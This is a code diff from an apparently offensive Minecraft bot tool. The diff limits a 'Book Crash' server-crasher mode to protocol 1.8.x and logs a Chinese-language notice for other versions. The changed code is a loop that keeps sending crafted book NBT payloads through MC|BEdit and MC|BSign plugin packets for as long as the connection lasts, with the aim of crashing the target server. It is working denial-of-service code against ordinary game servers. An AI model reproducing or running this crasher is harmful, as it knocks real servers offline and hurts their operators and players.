@@ -112,26 +112,30 @@ public class BotAttack extends IAttack {
 
                                     switch (ConfigUtil.ServerCrasherMode) {
                                         case 1:
-                                            while (c.isConnected()) {
-                                                try {
-                                                    ItemStack crashBook = getCrashBook();
+                                            if (MCForge.getProtocolVersion() == 47) {
+                                                while (c.isConnected()) {
+                                                    try {
+                                                        ItemStack crashBook = getCrashBook();
 
-                                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
-                                                    StreamNetOutput out = new StreamNetOutput(buf);
+                                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+                                                        StreamNetOutput out = new StreamNetOutput(buf);
 
-                                                    out.writeShort(crashBook.getId());
-                                                    out.writeByte(crashBook.getAmount());
-                                                    out.writeShort(crashBook.getData());
+                                                        out.writeShort(crashBook.getId());
+                                                        out.writeByte(crashBook.getAmount());
+                                                        out.writeShort(crashBook.getData());
 
-                                                    NBTIO.writeTag(new DataOutputStream(buf), crashBook.getNBT());
+                                                        NBTIO.writeTag(new DataOutputStream(buf), crashBook.getNBT());
 
-                                                    byte[] crashData = buf.toByteArray();
+                                                        byte[] crashData = buf.toByteArray();
 
-                                                    c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
-                                                    c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
+                                                        c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
+                                                        c.send(new ClientPluginMessagePacket("MC|BSign", crashData));
 
-                                                    OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
-                                                } catch (Exception ignored) {}
+                                                        OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
+                                                    } catch (Exception ignored) {}
+                                                }
+                                            } else {
+                                                LogUtil.doLog(0, "Book Crash仅适用于1.8.X版本。", "ServerCrasher");
                                             }
                                             break;
                                         case 2:
